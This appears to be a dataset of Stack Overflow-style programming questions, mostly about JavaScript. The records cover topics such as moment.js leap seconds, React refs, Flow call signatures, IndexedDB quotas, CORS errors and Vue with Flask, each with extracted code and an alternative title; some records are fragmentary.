How does moment.js handle leap seconds," I need a way to always add a whole minute to a timestamp, even if the minute is 61 seconds long due to a planned leap second. Does anyone know if moment().add(1, 'minute') adds a minute regardless of leap seconds? Or does it just always add sixty seconds? I've found how it handles addition over daylight savings time and leap years, but nothing at all for leap seconds.To give some background as to why this is important:I need to create a CSV file with a bunch of minute-by-minute sensor data for various sensors, formatted like: My data is stored with with the timestamp for the start of an hour, then an array of sixty data points for the hour. I turn this into a bunch of timestamp'd data by giving the first data point the hour's timestamp and adding sixty seconds to that value for each subsequent data point (as leap seconds always happen at the end of the hour and I only ever do an hour at a time, this should be fine). I then will need to build a dictionary mapping each timestamp to the value at that minute. This is necessary so that I can have the right data in the right row of the CSV; sensors may have started at different times or may have been powered off for a certain hour or not reported for a certain part of the hour; I can't just assume that all sensors have the same data. I'm finding all of the timestamps over which the CSV will be created with the following code: But I'm not sure if it's safe. If I need to, I could just change date.add(1, 'minute') to date.add(1, 'minute').startOf('minute'), but this could add a lot to the execution time and I'd like to avoid it if possible. <code>  time,sensor1,sensor21491329921800,20,211491329981800,22,21 { timestamp: Date(2017,2,24,12,0,0), temperature: [20, 22, 23, ... <60 elements total>]} var date = moment(startDate); var end = endDate.getTime(); var timestamps = []; while(date.valueOf() < end) { timestamps.push(date.valueOf()); date.add(1, 'minute') } timestamps.push(date.valueOf());",How does moment.js handle leap seconds?

Why is the ES6 spread operator unsuitable for copying multidimensional arrays?," From mdn: Spread Syntax Note: Typically the spread operators in ES2015 goes one level deep while copying an array. Therefore, they are unsuitable for copying multidimensional arrays. It's the same case with Object.assign() and Object spread syntax. Look at the example below for a better understanding. What is the point of the above statement? The above code sample works just the same as if you'd copied the array in a to b using the .slice() method. I tried adding another dimension to the array here: https://repl.it/HKOq/2 and things still worked as expected.So why is the spread syntax unsuitable for copying multidimensional arrays? I'd appreciate any help.EDIT: Reading the answers by estus and vol7ron helped me figure things out. Basically, as estus points out technically there are just arrays inside arrays rather than multidimensional arrays. And as vol7ron explains only the first level of the array is copied so the objects in memory remain the same for any further nested elements.I was also wrong to suspect that using the spread syntax was supposed to behave any differently than the slice operator  <code>  var a = [[1], [2], [3]];var b = [...a];b.shift().shift(); // 1// Now array b is: [[2], [3]]",Why is a spread element unsuitable for copying multidimensional arrays?

React - reference in a parent component a ref in a child component," I'm not trying to do anything hacky using refs. I just need the ref to the element because the element is a canvas, and to draw on a canvas you need its ref. ===== Something I tried (which technically works but feels strange) is define the <canvas> in the parent, so in its ref function, this refers to the parent component. Then I pass the <canvas> and this.canvas to the child as two separate props. I return the <canvas> (named this.props.canvasJSX) in the child's render function, and I use this.canvas (named this.props.canvasRef) to get its context to draw on it. See below: Is there a more standard way of achieving this? <code>  class Parent extends Component { clickDraw = () => { // when button clicked, get the canvas context and draw on it. // how? } render() { return ( <div> <button onClick={this.clickDraw}> Draw </button> <Child /> </div> ); }}class Child extends Component { componentDidMount() { const ctx = this.canvas.getContext('2d'); // draw something on the canvas once it's mounted ctx.fillStyle = ""#FF0000""; ctx.fillRect(0,0,150,75); } render() { return ( <canvas width={300} height={500} ref={canvasRef => this.canvas = canvasRef}> </canvas> ); }} class Parent extends Component { clickDraw = () => { // now I have access to the canvas context and can draw const ctx = this.canvas.getContext('2d'); ctx.fillStyle = ""#00FF00""; ctx.fillRect(0,0,275,250); } render() { const canvas = ( <canvas width={300} height={500} ref={canvasRef => this.canvas = canvasRef}> </canvas> ); return ( <div> <button onClick={this.clickDraw}> Draw </button> <Child canvasJSX={canvas} canvasRef={this.canvas} /> </div> ); }}class Child extends Component { componentDidMount() { const ctx = this.props.canvasRef.getContext('2d'); // draw something on the canvas once it's mounted ctx.fillStyle = ""#FF0000""; ctx.fillRect(0,0,150,75); } render() { return this.props.canvas; }}",React - Get the ref present in child component in the parent component

How to define a function with multiple call signatures in Flow?," In JavaScript, it's common to have a function that may be called in more than one way e.g. with handful of positional arguments or a single options object or some combination of the two.I've been trying to work out how to annotate this.One way I tried was to annotate rest args as a union of various possible tuples: The above snippet is contrived; I could probably just use (...args: Array<string | number>) in this example, but for more complex signatures (e.g. involving a typed options object that can be alone or with prior args) it would be useful to be able to define a precise, finite set of possible call signatures.But the above doesn't type-check. You can see a bunch of confusing errors in tryflow.I also tried typing the function itself as a union of separate entire function defs, but that didn't work either: How should I approach type-annotating functions with multiple possible call signatures? (Or are multi-signatures considered an anti-pattern in Flow, and I just shouldn't be doing it at all in which case, what is the recommended approach for interacting with third party libraries that do it?) <code>  type Arguments = | [string] | [number] | [string, number];const foo = (...args: Arguments) => { let name: string; let age: number; // unpack args... if (args.length > 1) { name = args[0]; age = args[1]; } else if (typeof args[0] === 'string') { name = args[0]; age = 0; } else { name = 'someone'; age = args[1]; } console.log(`${name} is ${age}`);};// any of these call signatures should be OK:foo('fred');foo('fred', 30);foo(30); type FooFunction = | (string) => void | (number) => void | (string, number) => void;const foo: FooFunction = (...args) => { let name: string; let age: number; // unpack args... if (args.length > 1) { name = args[0]; age = args[1]; } else if (typeof args[0] === 'string') { name = args[0]; age = 0; } else { name = 'someone'; age = args[1]; } console.log(`${name} is ${age}`);};// any of these call signatures should be OK:foo('fred');foo('fred', 30);foo(30);",How to annotate a function with multiple possible call signatures in Flow?

"Detect Firefox IndexedDB persistent storage limit, without filling up the disk?"," I'd like to use IndexedDB to process a lot of data. Too much data to fit in memory. To do this, I would like to use Firefox's IndexedDB persistent storage, which allows me to store more than 2GB worth of data (Firefox apparently has a limit of 2GB imposed on non-persistent storage).However, I've run into an issue. Firefox does not appear to be imposing a limit on the amount of data I can store in persistent storage. In fact, if I leave the following sample running, it will apparently run until the disk is full!Sample (Online) (Must be run in Firefox!): For obvious reasons, filling up a user's drive is not ideal. If the user does not have enough free disk space, it would be better not to try to run it at all, or at-least stop when more-than X% full.Strangely, according to MDN, it seems like the browser should be imposing a limit on the amount of data stored:The maximum browser storage space is dynamic it is based on your hard drive size. The global limit is calculated as 50% of free disk space. In Firefox, an internal browser tool called the Quota Manager keeps track of how much disk space each origin is using up, and deletes data if necessary.So if your hard drive is 500GB, then the total storage for a browser is 250GB. If this is exceeded, a process called origin eviction comes into play, deleting entire origin's worth of data until the storage amount goes under the limit again. There is no trimming effect put in place, to delete parts of origins deleting one database of an origin could cause problems with inconsistency.There's also another limit called group limit this is defined as 20% of the global limit. Each origin is part of a group (group of origins). There's one group for each eTLD+1 domain.However, my testing never threw any errors while it filled up the drive.Now my question is, is there any way to ensure putting a lot of data into Firefox's IndexedDB persistent storage will not fill up a user's drive, and make them very, very angry? <code>  <!DOCTYPE html><html> <head> <meta charset=""utf-8"" /> <title>Firefox IndexedDB Limit Test</title> </head>","Detect Firefox IndexedDB or Web Storage storage limit, without filling up the disk?"

Can this regex be written more elegantly?," I recently needed to create a regular expression to check input in JavaScript. The input could be 5 or 6 characters long and had to contain exactly 5 numbers and one optional space, which could be anywhere in the string. I am not regex-savvy at all and even though I tried looking for a better way, I ended up with this: This does what I need, so the allowed inputs are (if 0 is any number) I doubt that this is the only way to achieve such matching with regex, but I haven't found a way to do it in a cleaner way. So my question is, how can this be written better?Thank you.Edit:So, it is possible! Tom Lord's answer does what I needed with regular expressions, so I marked it as a correct answer to my question. However, soon after I posted this question, I realized that I wasn't thinking right, since every other input in the project was easily 'validatable' with regex, I was immediately assuming I could validate this one with it as well. Turns out I could just do this: Thank you all for the cool answers and ideas! :) Edit2: I forgot to mention a possibly quite important detail, which is that the input is limited, so the user can only enter up to 6 characters. My apologies. <code>  (^\d{5}$)|(^ \d{5}$)|(^\d{5} $)|(^\d{1} \d{4}$)|(^\d{2} \d{3}$)|(^\d{3} \d{2}$)|(^\d{4} \d{1}$) '00000' ' 00000' '0 0000' '00 000' '000 00' '0000 0' '00000 ' const validate = function(value) { const v = value.replace(/\s/g, '') const regex = new RegExp('^\\d{5}$'); return regex.test(v);} ",Regex to match exactly 5 numbers and one optional space

Like so: Please correct me if I'm wrong, but it seems to be best practice not to place multiple lines of business logic in the try body, so I'm left only with the alternative of declaring createdUser outside the block, assigning it in the block, and then using it after.What is best practice in this instance? <code>  let createdUsertry { createdUser = await this.User.create(userInfo)} catch (error) { console.error(error)}console.log(createdUser)// business// logic// goes// here",Correct Try...Catch Syntax Using Async/Await

jQuery - addClass on hover for multiple items," So I've been working on this script all day and all the examples I've seen just don't seem to do what I want. Here's my example CodePen. Try to hover over ""MENUS"" and over ""SETTINGS"". I'll try to explain the problem with words:The Script: The above code gives the blue line (class active-2) to the active item. In this case ""HOME"". The items variable counts all main menu items that are not active and is used to toggle blue line (active-2) from ""HOME"" when other items are hovered. So far so good.The Problem:I have submenu items (the dark-grey ones). When the mouse is anywhere over these submenu items I want to give the parent main item the blue line (active-2) until the mouse leaves, then return the blue line to the currently active item activeItem, in this case ""HOME"".When there is only 1 subitem group (like the one under ""MENUS""), it works. But when I added a second submenu group (under ""SETTINGS"") it broke. I'm looking for a way to make it so no matter how many submenu groups I have the main item's blue line should be visible when my mouse is over it's submenu items and return to activeItem when I'm no longer hovering it. If you delete one of the uls with class .sub-1 under ""MENUS"" or ""SETTINGS"" with the inspector it will start working again.Why mousemove???I tried to .addClass in .hover and .removeClass in it's callback function but that didn't work... Or maybe I'm just not doing it right? So basically the only way I could think of achieving this effect was with mousemove, checking for meaningless CSS properties that are given to subitems only when they are visible: So... I have no idea how to make it work in a meaningful way. Please help.Edit:Provided CodePen link at the top of the question. <code>  var activeItem = $(""#menu .active"");var items = $(""#menu .main:not(.active)"");activeItem.addClass(""active-2"");items.hover(function () { ""use strict""; activeItem.toggleClass(""active-2"");});$(document).mousemove(function (event) { ""use strict""; if ($("".sub-1"").css(""background-clip"").toLowerCase() == ""content-box"") { $("".sub-1"").parents("".main"").addClass(""active-2""); $("".sub-1"").parents("".main"").css(""background-color"", ""#CCC""); } else { $("".sub-1"").parents("".main"").removeClass(""active-2""); $("".sub-1"").parents("".main"").css(""background-color"", """"); }}); #menu li:hover > ul { left: auto; background-clip: content-box;}",addClass on hover for multiple items

Violation: Forced reflow while executing JavaScript in my React Text Clamp," I'm trying to make a reusable React text-clamp component. The user passes in the number of lines to render and the text they want to display, and the component renders their text, cutting it off at the specified number of lines and inserting an ellipsis (...) at the end.The way I'm calculating where to cut off the text and insert the ellipsis is to add one word at a time until the clientHeight of the text is bigger than the clientHeight of the container div.While it works, I'm seeing the following in the chrome dev tools:[Violation] Forced reflow while executing JavaScript took 179ms.This is probably due to the fact that reading clientHeight forces reflow.Here's my code: So basically, the main workhorse of the component is the renderText() function. In there I'm adding one word at a time until the height of the text is greater than that of its container. From there, I remove the last word and add the ellipsis. The optimizations I've made are the following:estimatedWordCount allows the loop that adds one word a time to not have to start at the beginning each time.I calculate the text that should be displayed by copying the dimensions of the actual container div to an offscreen, position:absolute div so it has no interaction with the other DOM elements.However, even with my optimizations chrome is still complaining that reflow due to javascript is taking too long.Are there any optimizations to my renderText() function I can make to avoid reading the clientHeight so often? <code>  class TextClamp extends React.PureComponent { constructor(props) { super(props); this.renderText = this.renderText.bind(this); this.state = { words: this.props.textToDisplay.split(' '), }; } componentDidMount() { this.renderText(); } renderText(isResizing = false) { const textEl = this.displayedText; const clampContainer = this.clampContainer; const heightToStop = isResizing ? clampContainer.style.height : this.letterHeightText.clientHeight * this.props.linesToRender; const dummyText = this.dummyText; const dummyDiv = this.dummyDiv; const words = this.state.words; const numWords = words.length; dummyDiv.style.cssText = `width: ${clampContainer.clientWidth}px; position: absolute; left: -1000px;`; let i = this.props.estimatedWordCount || 20; let strToRender = words.slice(0, i).join(' '); dummyText.textContent = strToRender; if (dummyText.clientHeight <= heightToStop && i>=numWords) { return; } while (dummyText.clientHeight <= heightToStop && i<numWords) { dummyText.textContent += ' ' + words[i++]; }; strToRender = dummyText.textContent; while (dummyText.clientHeight > heightToStop) { strToRender = strToRender.substring(0, strToRender.lastIndexOf(' ')); dummyText.textContent = strToRender + '\u2026'; } textEl.textContent = dummyText.textContent; } render() { const estimatedHeight = this.props.estimatedHeight || 20 * this.props.linesToRender; const containerStyle = { height: estimatedHeight, overflow: 'hidden'}; if (typeof window !== 'undefined') { const dummyDiv = document.createElement('div'); const dummyText = document.createElement('p'); dummyDiv.appendChild(dummyText); this.dummyDiv = dummyDiv this.dummyText = dummyText document.body.appendChild(dummyDiv); } return ( <div style={containerStyle} ref={(input) => {this.clampContainer = input;}}> <p ref={(input) => {this.displayedText = input;}}>{this.props.textToDisplay}</p> <p style={{visibility: 'hidden'}} ref={(input) => {this.letterHeightText = input;}}>Q</p> </div> ); }}",Performance improvement to React Text Clamp?

WebGL with google maps street view issue," I am developing a web app in Rails. When I open a marker, a modal pops up with a street view in a box. I can open one or two markers, but after that I get an error that WebGL has hit a snag. I have tried to look online for resources but nothing makes sense. See below pics for more info. Any help would be greatly appreciated.First image with errorHere is an image of what my console log looks like:Here is my JavaScript code in my webapp. This was the original code to get the modal to pop up with the information I needed. In order to add the street view inside of the modal the following code was added: In order to pass the current lat and long into the street view, I had to put it inside of the same function that the modal is being called on.UPDATEI cannot figure how to set var sv = new google.maps.StreetViewPanorama(div); so it is set once and the same map reused for each instance of the modal that is called rather than trying to start and restart a new instance.Update 2I cannot figure out how to initially initialize this part: So when I open a modal it does not render a new map it just reuses the same map. I am inclined to write another function but I need some guidance, please.UPDATE 3Something else I have noticed is that when I click on one marker it will show the street view filling its square in the modal.

"(JavaScript, PHP, Mysql) AJAX call on PHP function won't make it enter a value to my Database"," I've been working on a piece of code for a few days now but I somehow can't get this to pass the value 1 to my database.

HTML - Removing elements takes more time than adding elements - Why?," I have a table with a lot of rows (like 10.000).(Note: I realize it doesn't make sense to have a table that large, but I'd like to understand the below behavior).When I receive new data I want to clear the rows first. Weirdly enough, clearing the table takes much longer than building the rows from scratch. Clearing the table rows with html("""") or plain JS innerHTML = """" takes 1.5 minutes, much more than building the rows themselves, which takes less than a second. So my question:- Why does removing elements take more time than adding them? What happens 'behind the scenes'?(Please note my question is a Why one, I'm not looking for possible workarounds). UPDATE:I noticed that the table row and cells have floating definitions applied to them, and when I remove the float, the table is emptied out in an instance.I'd still really like to understand why the float makes the removal of the rows so much slower.Here a fiddle: https://jsfiddle.net/maaikeb/t5pduuue/In Chrome it takes 25 seconds to empty the table, and only 23 ms to append it to the DOM.*I read the below posts, but they talk more about possible solutions, and less about why removing elements takes more time than adding them, what actually happens when you remove them jQuery empty is very slowjQuery empty is very slowWhat is the best way to remove a table row with jQuery?Deleting table rows in javascriptjquery - fastest way to remove all rows from a very large table  <code> ",Why does removing elements take more time than adding elements?

XMLHttpRequest cannot load XXXX due to access control checks," My application worked perfectly until about an hour ago. Now I seem to be in limbo about figuring out why specific https requests are not working all browsers aside from chrome web. My first assumption is CORS. I have origin headers and everything set up as I have had for some time. Im not sure what changed. Here is the error I am getting on Safari XMLHttpRequest cannot load http://localhost:3000/auth/server/signup due to access control checks.Here is my CORS middleware devUrl is a var as the correct URL.Here are the calls in node that are not working Requests are working for other http requests and the url that it states I used in the error is the same/correct url. Ive been stuck for a while now and seriously need help. I have no idea how to debug this. Also, it refreshes the page every time I attempt the request as well. Im not sure what to do.The last route for social login is working?? Its only sign in and sign up that are affectedHere is my client-side code where the http requests are sent *** UPDATEI moved the signin button from inside the angular material md-step element to outside it and it worked fine.

Why is input[type='number'] reset when a decimal separator is entered?," I have an input field in which the user should only be able to enter digits [0-9]. jsFiddle DemoThe problem is this: When I enter a number (eg. 1234) and then press dot (.), + or - the content of the input field is automatically deleted by the browser (value is set to """" = empty string). But why? Changing the type from number to text seems to fix the problem. But then I lose the up/down arrow functionality of the input field.

"""i"" value in javascript for loop is not being recognized in a jquery function"," I'm using jQuery and ajax to open a bootstrap modal window. My code works perfectly when not in a loop, and my content is displayed appropriately in the modal window. But I have five modals on the page, and naturally I'd like to use a for loop so I don't repeat my code five times.It seems like a no-brainer to write a for loop to execute the code five times, but somehow, there is a problem, and when I put the code into a for loop, the modal content will not show in the opened window.Here is code that works how I need it, so the modal content from my modal1.php file shows in a modal popup window. Notice that the i variable is used three times; once in the jQuery selector, and twice in the $.ajax(...) area: This code below uses the variable i the exact same way as the code above. However, with the code below, the modal1.php content does not show (nor do any of the other files named 'modal[i].php'). Instead, only a blank dark background appears when they are opened. So I don't understand why the $.ajax() area of the code won't recognize the i variable in the for condition, but it will recognize it in the initial jQuery selector $('#modal' + i), which I've tested and found to be true. Is there a way I can write this loop so that the ajax area will recognize the i variable? Or is there a mistake in my code that I'm overlooking?Incidentally, I've noticed that similar questions have been asked, but they have been downvoted for not being clearly written. I've read them all, and they don't answer the question that I have today. <code>  var i = 1;$('#modal' + i).on('show.bs.modal', function(e) { var id = e.relatedTarget.dataset.id; $.ajax({ type:'post', url:'modals/modal' + i + '.php', data:{id:id}, success:function(data){ $('#modal' + i).html(data); } });}); for (i = 1; i < 6; i++) { $('#modal' + i).on('show.bs.modal', function(e) { var id = e.relatedTarget.dataset.id; $.ajax({ type:'post', url:'modals/modal' + i + '.php', data:{id:id}, success:function(data){ $('#modal' + i).html(data); } }); });}","""i"" value in JavaScript for loop is not being recognized in a jquery function"

Align arbitrary number of elements with different widths to a grid," EDITI've accepted the answer given by @user943702 below. I needed to modify it slightly to work with my Vue implementation as shown in the snippet below. I have an unknown number of elements that can have different widths. I want to align these elements in a grid so that their left sides line up in each column. Additionally, I want the elements to wrap when the window is sized smaller and maintain the grid. I mocked up what I want in the images below.I am using VueJS 2 to populate the elements into the grid and CSS Flexbox to organize the elements using the following CSS. Below is an example snippet of how it functions now: This almost works; the elements each have their own width and wrap when the window is resized. However, the elements do not align to a grid.I've also looked into using CSS Grid, but it looks like you either have to specify the width of each element or the number of columns, both of which I need to be arbitrary.I'm open to any solution using CSS or JavaScript (not JQuery please). I'd prefer to not include a 3rd party library but will consider it if it's the only option. <code>  const theElements = [{ name: ""ele1"", children: [{ name: 1 }, { name: 2 }, { name: 3 }, { name: 4 }, { name: 5 }]}, { name: ""ele2"", children: [{ name: 1 }, { name: 2 }, { name: 3 }]}, { name: ""ele3"", children: [{ name: 1 }, { name: 2 }, { name: 3 }]}, { name: ""ele4"", children: [{ name: 1 }, { name: 2 }, { name: 3 }]}, { name: ""ele5"", children: [{ name: 1 }, { name: 2 }, { name: 3 }]}, { name: ""ele6"", children: [{ name: 1 }, { name: 2 }, { name: 3 }]}, { name: ""ele7"", children: [{ name: 1 }, { name: 2 }, { name: 3 }]}, { name: ""ele8"", children: [{ name: 1 }, { name: 2 }, { name: 3 }]}, { name: ""ele9"", children: [{ name: 1 }, { name: 2 }, { name: 3 }]}, { name: ""ele10"", children: [{ name: 1 }, { name: 2 }, { name: 3 }]}, { name: ""ele11"", children: [{ name: 1 }, { name: 2 }, { name: 3 }, { name: 4 }, { name: 5 }]}, { name: ""ele12"", children: [{ name: 1 }, { name: 2 }, { name: 3 }]}];new Vue({ el: '#ele-grid', data: { elements: theElements }, methods: { // find the first grid line excess {max} // return index;

Controller component: Template: <code>  describe('sign-up', function () { angular.mock.module('myApp'); angular.mock.inject(function($componentController, $rootScope, $document) { let scope = $rootScope.$new(); let signUp = $componentController('signUp', {$scope: scope}); console.log(`signup = ${signUp}`); for (let [k,v] of signUp) { // there is no field signUp.firstName // but inside the controller code referencing // this.firstName is working console.log(`signup.${k} = ${v}`); } // jquery cannot find #firstName node // $('#firstName').val('dan') gets the same outcome $document.find('#firstName').val('dan'); expect($document.find('#firstName').val()).toBe('dan'); // without DOM form submission is not possible }); });}); angular. module('myApp'). component('signUp', { templateUrl: template, controller: [ function () { this.form = {}; var self = this;}]}); <form novalidate name=""$ctrl.form"" > <div class=""form-group""> <input type=""text"" class=""form-control"" ng-model=""$ctrl.firstName"" required name=""firstName"" id=""firstName"" /> </div> </form>",How to test angularjs component with DOM

JavasScript - Declaring counter variable outside for loop renders it slower?," I was looking for some micro optimizations of some JavaScript legacy code I was revisiting and noticed that in most frequently called for loops, counters were declared once in the global scope, outside the functions using them. I was curious whether that was indeed an optimization therefore I have created the following test case in JavaScript: What happens is that letItNotBe() runs significantly faster than letItBe(), in Chrome, Firefox and also NodeJS Chrome:NodeJS:Changing let with var makes no difference.Initally my logic was that declaring a new counter variable every time a function is called would be indeed slower than if a variable is initially declared and then simply reset to 0. However, it turns out to be quite the oposite and the difference in execution time is quite substential. My simple explanation is that when the counter variable is declared ouside the function using it, in some way the JS transpiler needs to refer to this variable. And since it is in the parent scope it takes more executions to reference it when incrementing. However that's just blind guessing.Can anybody give any meaningful explanation why this is happening, since I need to refactor the code and give a meaningful explanation mysefl besides the test that I already have :) Thanks.  <code>  var tmp = 0;function test(){ let j = 0; function letItBe(){ for(j = 0; j < 1000; j++){ tmp = Math.pow(j, 2); } } function letItNotBe(){ for(let l = 0; l < 1000; l++){ tmp = Math.pow(l, 2); } } console.time(""let it be""); for(var i =0; i < 10000; i++){ letItBe(); } console.timeEnd(""let it be""); console.time(""let it not be""); for(var i =0; i < 10000; i++){ letItNotBe(); } console.timeEnd(""let it not be"");}test();",Why does declaring a counter variable outside of a nested function make a loop 5x slower?

The similar API endpoints and JavaScript side code is already working.NoteI've seen a solution where it suggests that the request body should have 2 attributes: one which the JSON section goes under, another for the image. I'd like to see if it is possible to have it automatically converted to DTO. Update 1The upload payload sent by the client should be converted to the following DTO: So you can say it's a mix of JSON and multipart.SolutionThe solution to the problem is to use FormData on the front-end and ModelAttribute on the backend: and on the front-end, get rid of Content-Type as it should be determined by the browser itself, and use FormData (standard JavaScript). That should solve the problem. <code>  export function createExpense(formData) { return dispatch => { axios.post(ENDPOINT, formData, headers: { 'Authorization': //..., 'Content-Type': 'application/json' } ).then(({data}) => { //... }) .catch(({response}) => { //... }); };} _onSubmit = values => { let formData = new FormData(); formData.append('title', values.title); formData.append('description', values.description); formData.append('amount', values.amount); formData.append('image', values.image[0]); this.props.createExpense(formData); } @RequestMapping(path = ""/{groupId}"", method = RequestMethod.POST)public ExpenseSnippetGetDto create(@RequestBody ExpensePostDto expenseDto, @PathVariable long groupId, Principal principal, BindingResult result) throws IOException { //..} org.springframework.web.HttpMediaTypeNotSupportedException: Content type 'multipart/form-data;boundary=----WebKitFormBoundaryapHVvBsdZYc6j4Af;charset=UTF-8' not supported public class ExpensePostDto extends ExpenseBaseDto { private MultipartFile image; private String description; private List<Long> sharers;} @RequestMapping(path = ""/{groupId}"", method = RequestMethod.POST, consumes = {""multipart/form-data""})public ExpenseSnippetGetDto create(@ModelAttribute ExpensePostDto expenseDto, @PathVariable long groupId, Principal principal) throws IOException { //...}",Spring Boot controller - Upload Multipart and JSON to DTO

Throttle async calls in Vue 2," I have a Vue 2 application that uses an array of objects to back a search/multiselect widget provided by vue-multiselect.I have looked at the Vue 1 -> 2 migration guide on debouncing calls, but the example they give did not propagate the arguments from the DOM elements to the business logic.Right now the select fires change events with every keystroke, but I would like to throttle this (EG with lodash#throttle) so I'm not hitting my API every few milliseconds while they're typing.

Add ld+json script tag win client side React," I have currently build a React app. Since it's a SPA, it has a single index.html file. I want to add 2 ""ld+json"" script tags, i.e for reviews and bookmarks for a certain route. I've injected the script tag in componentDidMount of that component but the Google Structured Data Testing Tool doesn't read that. Is it because Google reads directly from index.html and since my script tags are bundled inside main.js, it cannot read it?Is it possible to do this in client side React? Is server side rendering the only possible way to do it?-- Detailed Explanation---I currently want to implement a system like IMDB has i.e whenever we search for a movie in goole; the IMDB search result will show the rating of the movie in the google pages itself. To do that I've need to put a script in my index.html file Since my app is an SPA, I cannot put this in my main index.html file.My current approach: Suppose ""/movies/inception"" route renders ""MovieDetail"" component. So, I'm currently adding the script at the end of this component. My JsonLd component So, when i inspect the component; i can see the dynamically added script tag. But, in the structure testing tool ""https://search.google.com/structured-data/testing-tool"" . It doesnt show the schema after validation. Hence, I asked whether it can be done via client side or SSR is only solution for this where i can give an updated index.html as a response. I hope this clears the confusion. Thanks! <code>  <script type='application/ld+json'> { ""@context"": ""http://schema.org/"", ""@type"": ""Review"", ""itemReviewed"": { ""@type"": ""Thing"", ""name"": ""Name"" }, ""reviewRating"": { ""@type"": ""Rating"", ""ratingValue"": ""3"", ""bestRating"": ""5"" }, ""publisher"": { ""@type"": ""Organization"", ""name"": ""1234"" } }</script> import React from 'react';import JsonLd from '../path_to_JSONLD';class MovieDetail extends React.Component { render(){ let data = { ""@context"": ""http://schema.org/"", ""@type"": ""Review"", ""itemReviewed"": { ""@type"": ""Thing"", ""name"": ""Name"" }, ""reviewRating"": { ""@type"": ""Rating"", ""ratingValue"": ""3"", ""bestRating"": ""5"" }, ""publisher"": { ""@type"": ""Organization"", ""name"": ""1234"" } } return( <SOME COMPOENTS /> <JsonLd data={data} /> )} import React from 'react';const JsonLd = ({ data }) => <script type=""application/ld+json"" dangerouslySetInnerHTML={{ __html: JSON.stringify(data) }} />; export default JsonLd;",Add ld+json script tag in client-side React

Hiding API keys in serverless JS setup," I'm creating a simple UI with an HTML+CSS+JS setup that uses a third-party API requiring a key and I'd like to keep the key in a file that I can gitignore and access from my Javascript file. I'm not going to be deploying this project, I just want to be able to push it to GitHub without temporarily deleting the variable before every commit.All responses I've found are related to setups with Node.js, React/Webpack, or other server setups, but I don't have a server or transpiler and don't want to add a bunch of cruft and configurations just for this. Is there a way to do that? I tried storing it in a separate JS file and import/export, but either I couldn't get the syntax right or what I was trying needed a transpiler. Every attempt variation resulted in a syntax error or undefined variable. Key information:This is project run entirely locally--as in, just opening index.html in my browser--so I don't think I need to worry about the key being exposed in the client. My setup pretty much just includes index.html, main.js, and style.css. I want to push the project to GitHub, so I want to store the api key as a variable in a file separate from main.js that I can add to .gitignore but access in main.js. I'm keeping this as simple as possible without frameworks, etc. Unless it's super simple and lightweight, I don't want to add libraries just to get this working. <code> ",Hiding API keys in JS setup

Is there any justification for `x > y && y < x`?," I was going through some Javascript code used to validate form entry and I noticed an if statement that read if (!(x < y && y > x)) {...}My initial thought was that this sort of tautological construction is completely redundant, and one of the two comparisons should be dropped. Just in case there's a chance I'm wrong and there's actually more to it, though, I thought I'd ask.My other thought was that it might be a case of some idiom that is necessary in another language, which the programmer has here just brought along with them to Javascript out of habit (although I'd be surprised to find a language where something like this is required that is also used in any sort of environment).EDITThe specific code is in a function to test that the start and end dates for a submitted event are possible (i.e. the end date is after the start date). The actual example reads if(!(start_time < end_time && end_time > start_time)) {...} where both start_time and end_time are DateTime values.EDIT 2Not a duplicate of this question as in this case the issue is the need to test two conditions that appear mutually inclusive in an if statement, whilst in that case the issue is how to make an if statement resolve that appears to require two mutually exclusive conditions to be simultaneously true. <code> ",Is there any justification for `x < y && y > x`?

A possibly more efficient approach would be appreciated.Clarification: Based upon some of the comments:funcArray is global.The goal is to implement middleware for a Node.js HTTP module in as simple and efficient a manner as possible without using any third-party modules. <code>  funcArray = [func1, func2, func3]; function func1() { // I get current function caller var currentFunc = func1.caller; // I want to execute the next function. Happens to be func2 in the example.}","In JavaScript, how to execute next function from an array of functions"

I just want to know how many events a socket.io can handle?," I was trying Socket.io (server and client) for my personal project. As it is my first try with node.js even javascript and mongodb I am bit confused about performance of my server.I have created a complex real time system with many events and many rooms. Server have very limited events but clients have too many events. These events are distributed under rooms. For example - Room R1 >>Event R1E1,Event R1E2,Event R1E3....Event R1ENRoom R2 >>Event R2E1,Event R2E2,Event R2E3....Event R2ENAll the data is stored in mongodb. Working awesome.But issue arise when few clients (5-8) with 10-15 events registered start sending data. Server initially works fine but after couple of minutes it stops responding. Clients stay connected even server is not responding. Requests are pile up. Sometime server receive last sessions request.It all start when the ultimate device start registering events. So I want to know how many events a socket.io can handle ?P.S. Here what I think ""event"" is - Edit 2As I studied about node.js, a node is basically a process which runs on a single thread, if it requires to process other things it starts another node (an async thread), leaves new thread alone doing it's process and return to main thread running. If we want to process some sequences of process we use ""async/await"". In my case I am using async at only one place when client first connect. Here I query 3 different collections of mongodb and return the data on an event.My server is currently running on a MacBook pro (16 GB RAM, i7 6th gen quad core). It should handle at least 4-6 concurrent threads.I have created a load test, 100000 different events distributed under 1000 rooms with 5 request per second querying db. It was working fine. Almost 40% RAM and 250% CPU was max laod.My connection to db is persistent mean I connect to db as soon as server starts and keep that connection reference alive.So what is the issue? <code>  io.on('event', function(msg){ console.log( msg);});",How many events can socket.io handle?

How to check cell values in different sheets using Javascript and ExcelJS," I have a spreadsheet with two sheets. Sheet 1 contains 3 columns with 100s of rows of data (strings). Sheet 2 is to be used as a mastersheet of correct combinations for Sheet 1 to be checked against to make sure the values in in cell are correct. Sheet 2 has 3 columns also.What I would like to do is loop through Sheet 1 row by row, and check each cell's value in the row matches anywhere what is in Sheet 2, row by row.If a check fails, then further checks on that row should cease and the next row to be checked commences. Cells in Sheet 1 that couldn't be matched should be marked red.My code below is close to what I need, but is marking more cells incorrect than what is required. Example data would look like this:Sheet 1: Sheet 2: According to the sample data, there should be two errors (B5 and C11) that are marked red in Sheet 1 of new.xlsx.

Is point-free a tenet or a flavour of functional programming?," In case it matters this is about functional programming in JavaScript and in my examples Ill be using Ramda.While everybody at work has fully embraced functional programming, theres also a lot of discussions around how to do it right.These two functions will do exactly the same thing: take a list and return a new list in which all strings have been trimmed.

Vue.js with Flask - putting a value in a tag," My code was working just fine, then I decided to move it to flask. I'm using both Vue.js and Flask in my code. My html code is below: When I remove the {{ tab.name }}, it works just fine. If I add the tab.name into the v-bind:class=""tab.name"", it displays the correct tab.name in the website. That's all proof that the vue.js works, and that everything should be working. Through that debugging, I've found that the problem is in the {{ tab.name }} (not the tab.name, but the brackets outside it). What's the solution for that?My javascript is below: Edit: I just realized why it may not be working. {{ something }} is a flask thing, and it overrides the vue.js.

